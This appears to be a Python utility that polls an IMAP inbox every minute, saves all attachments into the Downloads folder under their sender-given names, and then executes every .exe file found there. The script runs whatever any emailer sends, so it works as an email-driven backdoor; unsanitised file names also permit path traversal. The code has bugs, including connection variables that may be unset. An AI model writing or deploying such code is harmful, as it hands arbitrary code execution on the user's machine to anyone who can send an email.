import imaplib
import email
import os
import time

def download_all_attachments_with_preview(imap_host, imap_user, imap_pass, download_dir):
    """
    Downloads all attachments from all emails in the Inbox
    and shows the first 3 lines of each email, handling cases
    where the email body might be None.
    """

    try:
        print("Connecting to IMAP server...")
        imap = imaplib.IMAP4_SSL(imap_host)
        print("Logging in...")
        imap.login(imap_user, imap_pass)
        print("Selecting Inbox...")
        imap.select('Inbox')

        print("Searching for emails...")
        _, data = imap.search(None, 'ALL')
        email_ids = data[0].split()

        if not email_ids:
            print("No emails found in the Inbox.")
            return

        for email_id in email_ids:
            print(f"Checking email ID: {email_id}")
            _, data = imap.fetch(email_id, '(RFC822)')
            raw_email = data[0][1]
            email_message = email.message_from_bytes(raw_email)

            # Print the first 3 lines of the email body (with None check)
            print("  Email preview:")
            email_body = email_message.get_payload(decode=True)
            if email_body is not None:
                for i, line in enumerate(email_body.splitlines()[:3]):
                    try:
                        print(f"    {line.decode('utf-8')}")
                    except UnicodeDecodeError:
                        print(f"    {line}")  # Print raw bytes if decoding fails
                if i < 2:
                    print("    (End of email body)")
            else:
                print("    (Email body is empty)")

            for part in email_message.walk():
                if part.get_content_maintype() == 'multipart' or part.get('Content-Disposition') is None:
                    continue

                file_name = part.get_filename()
                if file_name:
                    file_path = os.path.join(download_dir, file_name)
                    print(f"  Downloading {file_name} to {file_path}...")
                    with open(file_path, 'wb') as f:
                        f.write(part.get_payload(decode=True))
                    print(f"  Downloaded: {file_name} to {download_dir}")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if imap:
            print("Closing IMAP connection...")
            imap.close()
            imap.logout()

def execute_all_exe(directory):
    """Executes all .exe files in the given directory.

    Args:
      directory: The directory containing the .exe files.
    """
    for filename in os.listdir(directory):
        if filename.endswith(".exe"):
            filepath = os.path.join(directory, filename)
            # Add quotes around the filepath to handle spaces
            os.startfile(f'"{filepath}"') 

if __name__ == "__main__":
    imap_host = '%host%' #replace this
    imap_user = '%username%' #replace this
    imap_pass = '%password%' #replacet his
    download_dir = os.path.join(os.path.expanduser("~"), "Downloads")

    while True:
        download_all_attachments_with_preview(imap_host, imap_user, imap_pass, download_dir)
        execute_all_exe(download_dir)
        print("Sleeping for 60 seconds...")
        time.sleep(60)
